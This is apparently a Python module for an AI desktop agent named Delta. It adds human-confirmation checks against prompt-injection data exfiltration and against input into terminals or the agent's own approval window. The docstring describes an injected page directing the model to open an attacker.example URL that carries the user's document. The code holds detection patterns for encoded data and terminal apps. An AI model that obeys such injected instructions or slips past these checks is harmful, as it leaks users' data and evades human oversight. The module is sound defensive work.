"""Extra per-call checks the executor runs after the policy, for things a tool's risk level cannot say.

1. Read-then-exfiltrate (URLs). Once a task has read outside content, a page or file can tell the model
   to open `https://attacker.example/?d=<your document>`. Fetching or opening a URL is not a "send", so
   it used to pass freely. After taint, opening a URL needs a human yes when:
     - its host was not already visited in this task, named by the user in their request, or listed in
       `allowed_domains` (exact URLs that came back from web_search count as visited), or
     - it carries a long encoded value in its path, query or fragment (even to a visited host: the
       attacker's own page is a visited host).
   browser_search goes to the search engine, never to a host the page chose, so only the second rule
   applies to its query.
   Autopilot drops the first rule (a new site with no encoded data in the address opens without a
   question) and keeps the second: an address carrying a long encoded value still asks at every level.

2. Desktop input into places that run commands or control Delta. Typing, keys or clicks aimed at a
   terminal (cmd, PowerShell, Windows Terminal, the Run box) would run commands outside run_shell's
   checks, and input into Delta's own window could change its settings or approve its own requests.
   These always need a human yes, at every autonomy level, tainted or not. Tools say what they target
   through `input_target(args)`; when they cannot tell, they say so and the call is confirmed (fail
   closed to a question, never to a refusal).

Every rule here only turns ALLOW into ASK. Nothing is denied that was allowed before.

Each question comes back as a GuardAsk with a `kind`. STRICT_KINDS are the ones a person must answer
every time: "Allow for this task" never covers them (see ToolExecutor).
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Any
from urllib.parse import parse_qsl, unquote, urlsplit

from pydantic import BaseModel

from delta.core.state import CURRENT_REQUEST
from delta.tools.base import Tool, ToolResult

URL_TOOLS = {"fetch_page", "browser_open", "open_target"}
SEARCH_TOOLS = {"browser_search"}
# Desktop input tools: their WRITE-level calls (Enter, closing things) are taint-guarded, and every call
# aimed at a terminal or at Delta's own window is confirmed.
DESKTOP_INPUT = {"click_at", "click_element", "type_text", "press_keys", "set_field", "do_actions"}

# A run of base64/hex-looking characters. Hyphens, dots and %20 break it, so readable slugs and
# url-encoded sentences do not count; an encoded document or key does.
BLOB = re.compile(r"[A-Za-z0-9+/=_]{48,}")
MAX_VALUE = 200  # one query value or fragment this long (decoded) is carrying data, not a search
AUTOPILOT = "autopilot"

# Questions "Allow for this task" never answers: input into terminals or Delta itself, input whose
# target could not be checked, and addresses or searches that carry encoded data.
STRICT_KINDS = frozenset({"terminal", "delta_window", "unknown_target", "data_url", "search_data"})


@dataclass(frozen=True)
class GuardAsk:
    reason: str
    kind: str  # terminal | delta_window | unknown_target | data_url | search_data | new_host

    @property
    def strict(self) -> bool:
        return self.kind in STRICT_KINDS


_SECOND_LEVEL = {"co", "com", "org", "net", "ac", "gov", "edu", "gob", "nic", "or", "ne", "go"}


def site_of(host: str) -> str:
    """Registrable-ish domain: news.bbc.co.uk -> bbc.co.uk, docs.github.com -> github.com."""
    parts = host.lower().rstrip(".").split(".")
    if len(parts) >= 3 and len(parts[-1]) == 2 and parts[-2] in _SECOND_LEVEL:
        return ".".join(parts[-3:])
    return ".".join(parts[-2:])


def _split(url: str) -> Any:
    url = url.strip()
    return urlsplit(url if "://" in url else f"https://{url}")


def host_of(url: str) -> str:
    try:
        return (_split(url).hostname or "").lower().rstrip(".")
    except ValueError:
        return ""


def carries_data(url_or_query: str, *, is_query: bool = False) -> str:
    """Why this URL (or search query) looks like it is smuggling data out ("the address ..."), or ''."""
    if is_query:
        text = unquote(url_or_query)
        if BLOB.search(text):
            return "the search text carries a long encoded value"
        return "the search text is unusually long" if len(text) > MAX_VALUE else ""
    try:
        parts = _split(url_or_query)
    except ValueError:
        return "the address could not be read"
    for where, text in (("address", parts.path), ("query", parts.query), ("fragment", parts.fragment)):
        if BLOB.search(unquote(text)):
            return f"the address's {where} carries a long encoded value"
    values = [v for _, v in parse_qsl(parts.query, keep_blank_values=True)] + [unquote(parts.fragment)]
    if any(len(v) > MAX_VALUE for v in values):
        return "the address carries a very long value in its query"
    return ""


def _named_by_user(host: str) -> bool:
    req = CURRENT_REQUEST.get()
    if not req or not host:
        return False
    text = req.text.lower()
    return host in text or site_of(host) in text


def _url_of(name: str, args: BaseModel) -> str:
    raw = getattr(args, "target" if name == "open_target" else "url", "") or ""
    if name == "open_target" and "://" not in raw:
        return ""  # a file or folder, not a web address
    return str(raw)


class ExfilGuard:
    def __init__(self) -> None:
        self._sites: dict[str, set[str]] = {}  # task -> sites visited in it
        self._urls: dict[str, set[str]] = {}   # task -> exact URLs web_search returned in it

    def forget(self, task_id: str) -> None:
        self._sites.pop(task_id, None)
        self._urls.pop(task_id, None)

    def _known(self, task_id: str, host: str, allowed_domains: list[str]) -> bool:
        if site_of(host) in self._sites.get(task_id, set()) or _named_by_user(host):
            return True
        allowed = [d.lower().strip() for d in allowed_domains if d.strip()]
        return any(host == d or host.endswith("." + d) for d in allowed)

    def ask_reason(self, tool: Tool[Any], args: BaseModel, task_id: str, taint_source: str | None,
                   allowed_domains: list[str] | None = None, autonomy: str = "") -> str:
        """Why this call needs a human yes on top of the policy decision, or ''."""
        found = self.check(tool, args, task_id, taint_source, allowed_domains, autonomy)
        return found.reason if found else ""

    def check(self, tool: Tool[Any], args: BaseModel, task_id: str, taint_source: str | None,
              allowed_domains: list[str] | None = None, autonomy: str = "") -> GuardAsk | None:
        """The question this call needs on top of the policy decision (and what kind it is), or None."""
        name = tool.name
        if name in DESKTOP_INPUT and (found := _desktop_ask(tool, args)):
            return found  # every level, tainted or not
        if not taint_source:
            return None
        if name in SEARCH_TOOLS:
            why = carries_data(str(getattr(args, "query", "")), is_query=True)
            if not why:
                return None
            return GuardAsk(f"this task read outside content ({taint_source}) and {why}; please confirm",
                            "search_data")
        if name not in URL_TOOLS or not (url := _url_of(name, args)):
            return None
        if url.strip() in self._urls.get(task_id, set()):
            return None  # a result web_search gave us, unchanged: it cannot carry anything read later
        host = host_of(url)
        if why := carries_data(url):
            return GuardAsk(f"this task read outside content ({taint_source}) and {why}, which could be sending "
                            "your data to that site; please confirm", "data_url")
        if autonomy == AUTOPILOT:
            return None  # Autopilot: a plain address on a new site opens without a question
        if not self._known(task_id, host, allowed_domains or []):
            return GuardAsk(f"this task read outside content ({taint_source}) and {host or 'this address'} is a "
                            "new site for it; opening it could send data there. Please confirm", "new_host")
        return None

    def observe(self, task_id: str, name: str, args: BaseModel, result: ToolResult) -> None:
        """Remember the sites a task really visited and the URLs its searches returned."""
        if not task_id or not result.ok:
            return
        found: list[str] = []
        if name in URL_TOOLS and (url := _url_of(name, args)):
            found.append(url)
        ev_url = result.evidence.get("url") if isinstance(result.evidence, dict) else None
        if isinstance(ev_url, str) and ev_url.startswith(("http://", "https://")):
            found.append(ev_url)  # where the browser really is (after redirects or in-page clicks)
        sites = self._sites.setdefault(task_id, set())
        sites.update(site_of(h) for u in found if (h := host_of(u)))
        if name == "web_search":
            urls = result.evidence.get("urls") if isinstance(result.evidence, dict) else None
            if isinstance(urls, list):
                self._urls.setdefault(task_id, set()).update(str(u).strip() for u in urls)


# --- desktop input targets --------------------------------------------------------------------------

TERMINAL_PROCESSES = {"cmd.exe", "powershell.exe", "pwsh.exe", "windowsterminal.exe", "conhost.exe",
                      "openconsole.exe", "wt.exe", "wsl.exe", "bash.exe", "mintty.exe", "alacritty.exe",
                      "wezterm-gui.exe", "putty.exe", "powershell_ise.exe"}
TERMINAL_CLASSES = {"consolewindowclass", "cascadia_hosting_window_class", "pseudoconsolewindow",
                    "mintty", "puttyconfigbox", "putty"}
TERMINAL_TITLE = re.compile(r"(^|[\s:\\])(windows powershell|powershell|command prompt|cmd\.exe|"
                            r"windows terminal|terminal|developer powershell)\b", re.I)
BROWSER_PROCESSES = {"msedge.exe", "chrome.exe", "brave.exe", "firefox.exe", "opera.exe", "vivaldi.exe"}


def is_terminal(title: str, cls: str, process: str) -> bool:
    if process.lower() in TERMINAL_PROCESSES or cls.lower() in TERMINAL_CLASSES:
        return True
    if title.strip() == "Run":  # Win+R: whatever is typed there runs
        return True
    return bool(TERMINAL_TITLE.search(title)) and process.lower() in ("", "explorer.exe")


def is_delta_window(title: str, process: str) -> bool:
    """Delta's dashboard: its app window ("Delta", "<chat> · Delta", "(2) Approval needed · Delta"), or
    the same page in an ordinary browser tab ("Delta - Microsoft Edge")."""
    t = title.strip()
    if t == "Delta" or t.endswith(" · Delta") or " · Delta - " in t or " · Delta — " in t:
        return True
    return process.lower() in BROWSER_PROCESSES and bool(re.match(r"^Delta( [-–—] |$)", t))


def input_classes(tool: Tool[Any], args: BaseModel) -> list[str] | None:
    """The apps (process names) a desktop input call lands on, or None if they cannot be told."""
    probe = getattr(tool, "input_targets", None)
    if probe is None:
        return None
    try:
        targets = probe(args)
    except Exception:
        return None
    if not targets:
        return None
    names = sorted({(process or cls or title).lower() for title, cls, process in targets})
    return names if all(names) else None


def _desktop_ask(tool: Tool[Any], args: BaseModel) -> GuardAsk | None:
    probe = getattr(tool, "input_targets", None)
    if probe is None:
        return None
    try:
        targets = probe(args)
    except Exception:
        targets = None
    if targets is None:
        return GuardAsk("I could not check where this input goes (which window or button), so please confirm it",
                        "unknown_target")
    for title, cls, process in targets:
        if is_delta_window(title, process):
            return GuardAsk("this input goes to Delta's own window (its settings and approvals); please confirm",
                            "delta_window")
        if is_terminal(title, cls, process):
            label = title or process or "a terminal"
            return GuardAsk(f"this input goes to a terminal ({label}), where typing runs commands outside Delta's "
                            "shell checks; please confirm", "terminal")
    return None

